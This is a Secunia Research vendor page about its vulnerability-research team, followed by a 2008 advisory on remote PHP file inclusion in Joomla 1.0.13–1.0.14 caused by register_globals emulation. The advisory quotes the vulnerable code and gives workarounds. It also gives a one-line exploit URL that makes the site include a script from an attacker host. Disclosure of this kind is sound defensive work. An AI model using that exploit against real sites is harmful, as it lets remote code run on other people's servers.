How it works

## Accurate, reliable vulnerability insights at your fingertips

The Secunia Research team from Flexera is comprised of several security specialists who conduct vulnerability research in various products in addition to testing, verifying and validating public vulnerability reports. Since its inception in 2002, the goal of the Secunia Research team is to provide the most accurate and reliable source of vulnerability intelligence.

Delivering the world’s best vulnerability intelligence requires skill and passion. Team members continually develop their skills exploring various high-profile closed and open-source software using a variety of approaches, focusing chiefly on thorough code audits and binary analysis. The team has received industry recognition, including naming members to [Microsoft’s Most Valuable Security Researchers](https://msrc-blog.microsoft.com/2019/08/07/announcing-2019-msrc-most-valuable-security-researchers/) list.

Secunia researchers discover hard-to-find vulnerabilities that aren’t normally identified with techniques such as fuzzing, and the results have been impressive. Members of the Secunia Research team have discovered critical vulnerabilities in products from vendors including Microsoft, Symantec, IBM, Adobe, RealNetworks, Trend Micro, HP, Blue Coat, Samba, CA, Mozilla and Apple.

The team produces invaluable security advisories based on research of the vulnerabilities affecting any given software update. Sometimes a single update can address multiple vulnerabilities of varying criticalities and threats; but these advisories aggregate and distill findings down to a single advisory perfect for the prioritization of patching efforts within [Software Vulnerability Manager](/products/software-vulnerability-manager). Criticality scores are consistently applied along with details around attack vector and other valuable details within [Software Vulnerability Research](/products/software-vulnerability-research/secunia-research). Illegitimate vulnerability reports are also investigated and rejected so you can focus only on what truly matters.

| --- | --- | --- | --- |

Affects: Joomla 1.0.13 - 1.0.14
Vulnerability: (remote) PHP file inclusion possible if old
configuration.php
Date: 14-feb-2008
Introduction:
Remote PHP file inclusion is possible when RG\_EMULATION is not defined
in
configuration.php. This is typical when upgrading from an older version,
leaving configuration.php untouched. Furthermore, in PHP,
register\_globals
must be 'off', for this exploit to work.
In Joomla >=1.0.13, configuration.php-dist disables register\_globals
emulation, by defining RG\_EMULATION false. In older Joomla versions,
this
was defined in globals.php instead.
Users upgrading, without touching configuration.php (quite typical),
will have RG\_EMULATION
unset, resulting in the following vulnerability.
In Revision 7424 of globals.php, the 'configuration.php' file is
included
before registerGlobals() is called, allowing a malicious peer to
override any value set in configuration.php.
Details:
Since revision 7424, globals.php includes 'configuration.php' if
RG\_EMULATION is unset, and enables RG\_EMULATION by default for 'old
configuration files':
if( defined( 'RG\_EMULATION' ) === false ) {
if( file\_exists( dirname(\_\_FILE\_\_).'/configuration.php' ) ) {
require( dirname(\_\_FILE\_\_).'/configuration.php' );
}
if( defined( 'RG\_EMULATION' ) === false ) {
// The configuration file is old so default to on
define( 'RG\_EMULATION', 1 );
}
}
The registerGlobals function is called \*after\* having included
'configuration.php':
} else if (ini\_get('register\_globals') == 0) {
// php.ini has register\_globals = off and emulate = on
registerGlobals();
Maliciously set GET variables cause variables set by configuration.php
to be overwritten.
Looking in index.php:
require( 'globals.php' );
require\_once( 'configuration.php' );
Since 'configuration.php' was already included by globals.php, the
require\_once() won't include the configuration.php again (leaving
"attacker's" values untouched!).
The exploit:
http://joomlasite/index.php?mosConfig\_absolute\_path=http://malhost/php\_s
cript.txt
Workaround:
In index\*.php and administrator/index\*.php change:
require\_once( 'configuration.php' );
to
require('configuration.php');
Or disable RG\_EMULATION by using the line in configuration.php-dist in
configuration.php:
if(!defined('RG\_EMULATION')) { define( 'RG\_EMULATION', 0 ); } // Off by
default for security

Hendrik-Jan Verheij
